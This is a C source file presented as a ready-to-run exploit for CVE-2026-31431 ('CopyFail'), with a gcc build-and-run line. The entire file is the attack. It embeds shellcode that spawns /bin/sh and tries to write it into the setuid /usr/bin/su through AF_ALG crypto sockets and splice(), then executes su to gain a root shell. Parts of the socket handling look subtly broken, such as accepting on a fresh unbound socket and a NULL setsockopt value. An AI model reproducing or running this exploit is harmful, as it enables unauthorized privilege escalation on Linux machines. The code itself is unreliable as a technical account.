/*
 * CopyFail - CVE-2026-31431 Direct Exploit
 * gcc -o copyfail copyfail.c && ./copyfail
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <linux/if_alg.h>
#include <linux/socket.h>

#define TARGET "/usr/bin/su"

// Shellcode execve("/bin/sh")
unsigned char shellcode[] = 
"\x48\x31\xc9\x48\xf7\xe1\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69"
"\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0"
"\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05";

int main() {
    int fd, sock, op_sock, pipefd[2];
    struct sockaddr_alg sa = {
        .salg_family = AF_ALG,
        .salg_type = "aead",
        .salg_name = "authencesn(hmac(sha256),cbc(aes))"
    };
    
    printf("[*] CopyFail - CVE-2026-31431\n");
    printf("[*] Target: %s\n", TARGET);
    
    // Open target
    fd = open(TARGET, O_RDONLY);
    if (fd < 0) {
        perror("[-] open");
        return 1;
    }
    
    // Create AF_ALG socket
    sock = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (bind(sock, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
        perror("[-] bind");
        return 1;
    }
    
    op_sock = socket(AF_ALG, SOCK_SEQPACKET, 0);
    setsockopt(op_sock, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL, 0);
    listen(op_sock, 0);
    op_sock = accept(op_sock, NULL, NULL);
    
    // Create pipe
    pipe(pipefd);
    fcntl(pipefd[0], F_SETPIPE_SZ, 4096);
    
    // Write shellcode in chunks
    for (int i = 0; i < sizeof(shellcode); i += 4) {
        char aad[8] = {0};  // 4 bytes filler + 4 bytes payload
        memcpy(aad + 4, shellcode + i, 4);
        
        send(op_sock, aad, 8, MSG_MORE);
        splice(fd, NULL, pipefd[1], NULL, 4096, 0);
        splice(pipefd[0], NULL, op_sock, NULL, 4096, 0);
        recv(op_sock, NULL, 4096, 0);
    }
    
    close(fd);
    close(sock);
    close(op_sock);
    
    printf("[+] Shellcode written! Executing...\n");
    execl(TARGET, TARGET, NULL);
    
    return 0;
}